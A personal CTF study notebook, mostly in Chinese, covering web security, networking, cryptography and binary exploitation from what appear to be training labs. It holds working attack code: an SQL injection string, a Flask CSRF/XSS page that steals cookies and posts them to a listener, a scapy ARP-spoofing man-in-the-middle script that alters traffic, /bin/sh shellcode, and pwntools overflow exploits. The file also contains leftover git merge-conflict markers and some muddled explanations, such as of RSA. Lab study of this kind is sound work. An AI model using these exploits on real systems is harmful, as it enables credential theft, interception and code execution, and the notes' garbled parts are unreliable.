# sql注入
' OR 1=1 --
# Same origin:
scheme,host,port
# curl 进行路径解析的时候会把../自动略去，注意使用url encode

# url 注入技巧
%0A换行符

# XSS：chrome访问阻止 一些端口 如 6666等，1337不会触发
# 复杂请求 + 跨域 才会触发options
hacker@web-security~xss-7:~$ nc -lv localhost 1338
Listening on localhost 1338
Connection received on localhost 36852
GET /?auth=admin|.QXygTN2wiM2cjMyEzW} HTTP/1.1
Host: localhost:1338
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://challenge.localhost/
Origin: http://challenge.localhost
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4d
# XSS vs crsf
XSS 直接在网站中注入scirpt
crsf 导航到我们的网站的一些脚本
# csrf越过SOP （同源保护）
flask.redirect
img不行
form 自动提交也可以

form here:
<script>document.forms[0].submit</script>

# CSRF +XSS 示例：
```py
from flask import Flask, request
import flask

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        print("Got POST:", request.form)
        return "Received."

    import requests
    from urllib.parse import quote

    payload = """<form id='f' action='http://localhost:1338' method='POST'>
    <input type='hidden' name='cookie' id='c'>
    </form><script>document.getElementById('c').value=document.cookie;document.getElementById('f').submit()</script>"""
    encoded_payload = payload
    # encoded_payload = quote(payload)
    # encoded_payload="hellO!"
    url = f"http://challenge.localhost/ephemeral?msg={encoded_payload}"

    return f"""
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Welcome to my site!</h1>
        <form method="GET" action="{url}">
            <input type="hidden" name="msg" value="{encoded_payload}">
        </form>
        <script>
            setTimeout(() => document.forms[0].submit(), 500);
        </script>
    </body>
    </html>
"""

if __name__ == '__main__':
    app.run(host='hacker.localhost', port=1337, debug=True)

```
要点：
注意get 只会提交内部已有字段，与 url无关
另外：
不要quote，否则XSS 内嵌失败
# fetch 中 mode 的作用
no-cors:

https://www.google.com/search?q=fetch+mode%3Ano-cors&oq=fetch+mode%3Ano-cors&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDMzMzNqMGo0qAIAsAIB&sourceid=chrome&ie=UTF-8
限制预检，为了安全限制正文的出现，以及限制方法在一个范围。
a nice example:
https://stackoverflow.com/questions/43262121/trying-to-use-fetch-and-pass-in-mode-no-cors

# intercept communication:
网络地址中  mac vs ip：
mac设备独有，ip随地区变暖。
且 mac地址 只用于局域网设备鉴别。ip-> for complex rout
ethernet<- IP -< tcp
SYNC ->
<- SYNC and  ACK YOUR SYN
ACK ->

# ARP:address resolution protocol
由路由器进行，广播到所有mac设备 IP 同一层的.
简单来讲 这个协议基本上包含有 目标硬件地址（MAC） 所求类型 以及具体内容 + 源地址类型和具体内容（IP) 
# 网络中10.0.0/24是什么意思
前几位是子网的意思。网络号 + 主机号 = IP
# 扫描工具 nmap
sudo nmap -sn -n --stats-every 1s 10.0.0.0/24
-sn ping and ni port
-n no dns
sudo nmap -sn -n -T5 --min-parallelism 100 --min-rtt-timeout 50ms --max-retries 1 10.0.0.0/16
# tshark
跟踪流
sudo tshark -i eth0 -c 2 -T fields -e tcp.stream -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.flags -e tcp.len
输出内容:
tshark -i eth0 -f "port 31337 stream 0" -T fields -e data -c 150 | xxd -r -p
-f 抓包过滤
显示过滤tshark -i eth0 -Y "tcp.port == 80"
# ip:
ip addr show
sudo ip addr add 10.0.0.3/24 dev eth0
# ipconfig:
```shuchu
PS C:\Users\kokona> ipconfig

Windows IP 配置


无线局域网适配器 本地连接* 1:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

无线局域网适配器 本地连接* 2:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

无线局域网适配器 WLAN:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::3719:9b04:a84f:261e%21
   IPv4 地址 . . . . . . . . . . . . : 192.168.0.104
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.0.1

以太网适配器 蓝牙网络连接:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

```
默认网关的意思是，不在局域网子网中的时候，会发给路由器
"WIFI”是子网。而路由器是默认网关


tracert windows命令，给出经过的网关

# NAT：
our address -> 变成 中国电信的ip、

# 防火墙 iptables:
`iptables` 是 Linux 上经典的防火墙工具，用来设置**网络访问控制规则**。你可以用它来允许、拒绝、转发、记录各种进出网络的数据包。

---

## 🧱 iptables 基础结构

iptables 由 **表（tables）** 和 **链（chains）** 组成：

### 🔸 常用表（table）：

| 表名       | 作用              |
| -------- | --------------- |
| `filter` | 默认表，控制允许或拒绝流量   |
| `nat`    | 用于网络地址转换（如端口映射） |
| `mangle` | 修改数据包（如 TTL）    |

### 🔸 常用链（chain）：

| 链名                           | 说明               |
| ---------------------------- | ---------------- |
| `INPUT`                      | 流入本机的流量          |
| `OUTPUT`                     | 本机发出的流量          |
| `FORWARD`                    | 从一张网卡转发到另一张网卡的流量 |
| `PREROUTING` / `POSTROUTING` | 用于 NAT 转换场景      |

---

## ✅ 常见用法

### 1. 查看现有规则

```bash
sudo iptables -L -n -v
```

### 2. 允许端口（如 22）

```bash
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

### 3. 拒绝端口（如 80）

```bash
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

### 4. 只允许某个 IP 访问某端口

```bash
sudo iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT
```

### 5. 设置默认策略为拒绝所有流量

```bash
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP
```

> 然后你可以按需“放行”需要的服务，如 ssh、http。

---

## 🔁 清除所有规则（慎用）

```bash
sudo iptables -F        # 清除所有链中的规则
sudo iptables -X        # 删除自定义链
```

---

## 💾 保存规则（不同系统不同方式）

### Ubuntu/Debian：

```bash
sudo iptables-save > /etc/iptables/rules.v4
```

### CentOS/RHEL：

```bash
sudo service iptables save
```

---

## 🧠 小贴士

* `-A`：添加规则（Append）
* `-D`：删除规则（Delete）
* `-I`：插入规则（Insert）
* `-L`：列出规则（List）
* `-F`：清空规则（Flush）

---

## 📘 示例：只允许 SSH，拒绝其他

```bash
sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

---

如果你告诉我你想做什么（比如“只允许某个端口”，“屏蔽某个 IP”），我可以直接给你规则。需要吗？

# 三次握手代码：
```py
from scapy.all import *
import time
sniffer = AsyncSniffer()
sniffer.start()
# send the first syn
send(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31337, flags="S"))
time.sleep(0.1)
result = sniffer.stop()
result[0]
def return_target_pack(pack):
    try:
        if pack[TCP]and  pack[IP].dst=="10.0.0.1":
            return True
        return False
    except:
        return False
client_pack = result.filter(return_target_pack)[0]

seq_number = client_pack[TCP].seq
sniffer.start()
# 注意seq +1 以及ack +1
send(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31338,ack=seq_number+1, flags="A"))
time.sleep(1)

result = sniffer.stop()
print(result)
result[0].show()

```
# man in the middle writeup:
这个地方的关键是，ip转发机制的存在使得你必须在echo来之前发送掉对应的请求。
```py
from scapy.all import *
import threading
import time
import sys
import os

# 配置
real_ip = "10.0.0.3"
target_ip = "10.0.0.2"
server_ip = "10.0.0.3"
iface = conf.iface  # 默认网络接口

# 验证 root 权限
if os.geteuid() != 0:
    print("需要 root 权限运行！")
    sys.exit(1)

import os

def disable_ip_forward_sysctl():
    ret = os.system("sysctl -w net.ipv4.ip_forward=0")
    if ret == 0:
        print("IP forwarding disabled via sysctl.")
    else:
        print("Failed to disable IP forwarding via sysctl.")

disable_ip_forward_sysctl()


# 获取 MAC 地址并验证
def get_mac(ip):
    try:
        mac = getmacbyip(ip)
        if not mac:
            raise ValueError(f"无法获取 IP {ip} 的 MAC 地址")
        return mac
    except Exception as e:
        print(f"获取 MAC 地址失败 ({ip}): {e}")
        sys.exit(1)

try:
    my_mac = get_if_hwaddr(iface)
    target_mac = get_mac(target_ip)
    server_mac = get_mac(server_ip)
    print(f"我的 MAC: {my_mac}, 目标 MAC: {target_mac}, 服务器 MAC: {server_mac}")
except Exception as e:
    print(f"初始化失败: {e}")
    sys.exit(1)

# 持续发送 ARP 欺骗包
def send_arp_spoof():
    while True:
        try:
            sendp(Ether(dst=target_mac, src=my_mac) /
                  ARP(op=2, psrc=server_ip, hwsrc=my_mac, pdst=target_ip),
                  iface=iface, verbose=0)
            sendp(Ether(dst=server_mac, src=my_mac) /
                  ARP(op=2, psrc=target_ip, hwsrc=my_mac, pdst=server_ip),
                  iface=iface, verbose=0)
            time.sleep(5)
        except Exception as e:
            print(f"ARP 欺骗错误: {e}")
            time.sleep(5)

# 数据包处理回调函数
def handle_packet(pack):
    try:
        if (not pack.haslayer(IP) or not pack.haslayer(TCP)) or(pack[Ether].src==my_mac):
            return  # 忽略非 IP/TCP 包

        # 调试：打印原始包信息
        print(f"捕获包: {pack.summary()}")
        pack[TCP].show()
        # 创建新数据包副本以避免修改原始包
        new_pack = None 
        if pack.haslayer(Raw):
            new_pack = Ether()/IP()/TCP()/Raw(load=pack[Raw].load)
        else:
            new_pack = Ether()/IP()/TCP()

        if pack[IP].src == target_ip:
            print("SRC: 10.0.0.2")
            new_pack[Ether].dst = server_mac
            new_pack[Ether].src = my_mac
            new_pack[IP].dst = server_ip
            new_pack[IP].src = target_ip

            new_pack[TCP].sport = pack[TCP].sport
            new_pack[TCP].dport = pack[TCP].dport
            new_pack[TCP].seq = pack[TCP].seq
            new_pack[TCP].ack = pack[TCP].ack
            new_pack[TCP].flags = pack[TCP].flags

            if pack.haslayer(Raw):
                if pack[Raw].load == b"echo":
                    print("修改: echo -> flag")
                    new_pack[Raw].load = b"flag"
                if pack[Raw].load.startswith(b"pwn"):
                    print("触发退出条件")
                    sys.exit(0)
                if pack[Raw].load == b"Hello, World!":
                    print(" I FIND!!!!!!")
                    return 
                print(f"Payload: {new_pack[Raw].load}")
        elif pack[IP].src == server_ip:
            print("SRC: 10.0.0.3")
            new_pack[Ether].dst = target_mac
            new_pack[Ether].src = my_mac
            new_pack[IP].dst = target_ip
            new_pack[IP].src = server_ip

            new_pack[TCP].sport = pack[TCP].sport
            new_pack[TCP].dport = pack[TCP].dport
            new_pack[TCP].seq = pack[TCP].seq
            new_pack[TCP].ack = pack[TCP].ack
            new_pack[TCP].flags = pack[TCP].flags
            
            if pack.haslayer(Raw):
                print(f"Payload: {pack[Raw].load}")
                if pack[Raw].load == b'command: ':
                    new_pack[Ether].dst = my_mac
                    new_pack[Ether].src = target_mac
                    new_pack[IP].dst = server_ip
                    new_pack[IP].src = target_ip

                    new_pack[TCP].sport =pack[TCP].dport 
                    new_pack[TCP].dport =  pack[TCP].sport
                    new_pack[TCP].seq = pack[TCP].ack 
                    new_pack[TCP].ack =  pack[TCP].seq + 9
                    new_pack[TCP].flags = "PA"

                    new_pack[Raw].load= b"flag"
        # 调试：发送前打印校验和
        print(f"发送包: {new_pack.summary()}")
        print(f"IP 校验和: {new_pack[IP].chksum}, TCP 校验和: {new_pack[TCP].chksum}")
        sendp(new_pack, iface=iface, verbose=0)

        # 发送数据包
    except Exception as e:
        print(f"处理数据包错误: {e}")
        raise

# 主程序
def main():
    # 启动 ARP 欺骗线程
    arp_thread = threading.Thread(target=send_arp_spoof, daemon=True)
    arp_thread.start()

    # 启动嗅探器
    try:
        sniffer = AsyncSniffer(filter="tcp", iface=iface, prn=handle_packet)
        print("开始嗅探...")
        sniffer.start()
        sniffer.join()
    except KeyboardInterrupt:
        print("用户中断，退出...")

        sys.exit(0)
    except Exception as e:
        print(f"嗅探错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

# 密码学：
RSA 加密基本原理：
公钥是一个p和 一个因数
私钥是一个q和一个因数
数据m 加密等于：
m^p
私钥m^PQ mod n 就得到私有数据

# ONEPAD加密
一个 字节本 进行一次加密（抑或）然而无法多次使用 否则不安全

# AES 填充方块
AES 加密算法要求输入数据块大小为 16 字节（128 位），因此在加密时需要对输入数据进行填充，以满足块大小要求。常见的填充方式有：

1. **PKCS#7 填充**：
   - 在数据末尾添加若干字节，每个字节的值都为填充的字节数。例如，如果需要填充 5 个字节，则添加 5 个字节值为 0x05。

2. **Zero 填充**：
   - 在数据末尾添加零字节，直到达到块大小。这种方式不够安全，因为解密时无法确定原始数据长度。

3. **ANSI X.923 填充**：
   - 在数据末尾添加若干个零字节，最后一个字节为填充的字节数。

4. **ISO 10126 填充**：
   - 在数据末尾添加随机字节，最后一个字节为填充的字节数。

在实际应用中，PKCS#7 填充是最常用的填充方式。解密时需要根据填充方式去除填充字节，以恢复原始数据。
如果刚好满足16 会自动填充一个

# POA 攻击
加密流程：XOR 前一个快的密文，然后传到解码机器里
解密流程： 传到解码机器里，再XOR 前一个的密文。
根据pad是否有效，可以猜测出每个decode 之后的输出，之后，在此基础上，可以进行归零操作。
例如 密文C1，和 IV
如果操作一个向量 FAKE_IV 拼接C1,进去，没有传出padding error
那么 我们的FAKE_IV 相当于是把最后一个字节变成了0x01(unpadding之后随后消失)
那么再把这个FAKE_IV 抑或上 0x16 就能获得解密块


# 密钥交换算法 DHKE:
给定一个大指数，那么一个根的次方将会遍历整个质数的余数，从任意开始，从而实现密钥的安全交换。

# 欧拉定理：



# 改变用户组shell
newgrp

# 
发现一个有意思的点，不能查看当前目录有什么(.) 但是仍然可以 cat 对应内容

# 程序加载
- 查看是否含有shebang.
会呈现一个链式调用
```
#a1
```
```
#a2
```

will be a2 a1 ..file
- 在proc sys fs binfmt_misc 中查看
是否有对应格式 如果有会启动对应的解释器
- 动态链接程序 通过对应的inter 执行

<<<<<<< HEAD
=======
# section vs segement:
```
一、Section（节）—— 静态结构（供链接器使用）
每个 ELF 文件都有多个 Section，如 .text、.data、.bss、.rodata、.symtab、.strtab 等。

它们记录了代码、数据、符号表、字符串表、调试信息等。

作用：

供链接器使用（如 ld）

提供重定位、符号解析等功能

对象文件（.o）主要关注 section，执行文件或库也会保留它们（特别是带调试信息时）。

二、Segment（段）—— 动态结构（供加载器使用）
每个 ELF 文件也有多个 Segment，如 PT_LOAD、PT_INTERP、PT_DYNAMIC 等。

每个 segment 描述了可执行文件运行时的内存映射（比如代码段、数据段等）。

作用：

供加载器（如 Linux 的 ld.so）使用


```

# 金丝雀 
开始结束放入一个随机值。必须确保改值不被改变
# ASLR 随机地址分布：
可以通过修改末端字节来在同页面移动


# 查看文件启用安全选项：
```
hacker@binary-exploitation~your-first-overflow-hard:~$ checksec /challenge/binary-exploitation-first-overflow
[*] '/challenge/binary-exploitation-first-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```
checksec:
```
1. RELRO (Full RELRO)
Full RELRO 表示程序启用了完整的 Read-Only Relocations（只读重定位）保护。这可以防止攻击者修改程序的重定位表，增强了程序的安全性。

Partial RELRO 是较弱的保护，可能允许某些攻击绕过，而 Full RELRO 则更强大。

2. Stack (Canary found)
Canary found 表示启用了 栈保护（Stack Smashing Protector），即使用了所谓的 "canary" 技术来防止缓冲区溢出攻击。栈保护通过在函数的栈帧中插入一个特殊值（canary），如果溢出发生并覆盖了栈上的返回地址，程序就能检测到并终止，从而防止溢出攻击。

3. NX (NX enabled)
NX enabled 表示启用了 非执行堆栈（No eXecute，NX）。这项技术将堆栈区域标记为不可执行，从而防止攻击者利用溢出攻击执行恶意代码。

这使得攻击者即使成功执行了缓冲区溢出，也无法在堆栈上执行 shellcode。

4. PIE (No PIE)
No PIE 表示程序没有启用 位置无关可执行文件（Position Independent Executable）。PIE 是一种技术，它使得程序的地址在每次运行时都发生变化，从而增加了攻击者的破解难度。

如果启用了 PIE，程序的基地址会随机化，攻击者无法预先知道程序的确切地址，降低了攻击的成功率。

5. SHSTK (Enabled)
SHSTK enabled 表示启用了 堆栈保护，即使栈本身的可执行标志被禁用，堆栈的保护措施仍然有效，进一步增加了安全性。

6. IBT (Enabled)
IBT enabled 表示启用了 Indirect Branch Tracking。这是一个新的安全功能，用于防止某些类型的控制流攻击，如 Jump-Oriented Programming（JOP）和 Return-Oriented Programming（ROP）。它通过追踪间接跳转来加强安全性。

7. Stripped (No)
No 表示该二进制文件没有被剥离（stripped）。通常，剥离操作会移除调试符号和符号表，减小文件大小，并使逆向工程变得更加困难。然而，保留符号信息可以方便调试和分析程序。

```

# 表面紧邻的变量并不一定是连载一起的。
考虑一下对齐

# 函数进入时候的内存分布
返回地址
push rbp 带来的原始栈基址 同时，新的rbp  指向这里

变量...
...

...

# 常用命令：
gdb: x/gx
反汇编指定函数：
objdump -d
objdump -d ./challenge --disassemble=main --disassemble=win_authed
# pwntools gddb:
```py
def main():
    print("Hello from ctf-playground!")
from pwn import * 

from pwnlib import gdb
import os
# import gdb
files = os.listdir("/home/kokona/proj_lib/ctf_playground/challenge/")
file =filter(lambda x:not x.endswith((".c",".md")),files)
gdb_script = '''
b challenge 
c
printf "rsp+8: %p\\n", $rsp+8


'''
if __name__ == "__main__":
    url = os.path.dirname(os.path.abspath(__file__)) + "/challenge/" + next(file)
    print(url)
    # p = process(url)
    gdber = gdb.debug(url, gdbscript=gdb_script)
    rsp = input("input rsp here:")
    # assert isinstance(gdber,tube)

    # gdber.gdb.
    # gdber.sendline(b"c")


```
这里的gdb 很特殊 stdin，并不是接到gdb窗口的
# shellcode 注入：
Write your shellcode as assembly:
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 59		# this is the syscall number of execve
lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
mov rsi, 0		# this makes the second argument, argv, NULL
mov rdx, 0		# this makes the third argument, envp, NULL
syscall			# this triggers the system call
binsh:				# a label marking where the /bin/sh string is
.string "/bin/sh"
```

Then, assemble it!
注解：
nonstdlib作用：不要标准库 static：不要动态链接
gcc -nostdlib -static shellcode.s -o shellcode-elf
This is an ELF with your shellcode as its .text. You still need to extract it:
objcopy --dump-section .text=shellcode-raw shellcode-elf
The resulting shellcode-raw file contains the raw bytes of your shellcode.
This is what you would inject as part of your exploits.
直接调试
```
gcc -nostdlib -static shellcode.s -o shellcode-elf
	./shellcode-elf
```
也可以使用strace查看系统调用
https://docs.google.com/presentation/d/1kkfh-dhgxfIZPB1ziyW2JQiC1MbQWn8c7e24kOoDxJ4/edit?pli=1&slide=id.g9605bf3899_1_129#slide=id.g9605bf3899_1_129



# 寄存器内部当大端：
```
mov ebx,0x67616c66
shl rbx,8
mov bl,0x2f

```
最后是67....2f

# 未知bug:
p.sendline(shellcode)
会输入0a.(回车一并输入)
经过测试，是由于输送间隔太短的原因。
```py

from pwn import * 
import os
context.terminal = ["tmux","splitw","-h"] 
files = os.listdir("/challenge/")
file =filter(lambda x:not x.endswith((".c",".md")),files)
gdb_script = '''

'''
if __name__ == "__main__":
    url =  "/challenge/" + next(file)
    # 0x00005c56e905b345 
    p = process(url)
    with open("./shellcode-raw","rb") as f:
        shellcode = f.read(4096)
    rbp = 2**64-1  # Example value, replace with actual rbp address
    p = process(url)  # SIGSTOP to pause the process

    ret_addr =0x15870000
    p.send(shellcode)
    p.recvuntil(b"Press enter to continue!")
    p.sendline(b"")
    p.sendline(b"A"*0x30 +rbp.to_bytes(8,"little")+ret_addr.to_bytes(8,"little"))
    # print(p.recvall(1).decode())
    print(p.recvall(1).decode())
# 

#     rbp = 2**64-1  # Example value, replace with actual rbp address
#     for i in range(16): 
#         p = process(url)  # SIGSTOP to pause the process

#         ret_addr = 0xb8f + i * 0x1000
#         num_bits = 2
#         print(i)
#         p.send(b"\x00"+b"A"*0x6f +rbp.to_bytes(8,"little")+ret_addr.to_bytes(2,"little"))
#         print(p.recvall().decode())
# # 
```

# 

# web 服务器段存储的密码是hash mima

# 各个地址：
    network = Network("router", hosts={
        alice_host: "10.0.0.1",
        bob_host: "10.0.0.2",
        mallory_host: "10.0.0.3",
        sharon_host: "10.0.0.4",
        hacker_host: "10.0.0.5",
    })
>>>>>>> 38578d7 (...sth save)
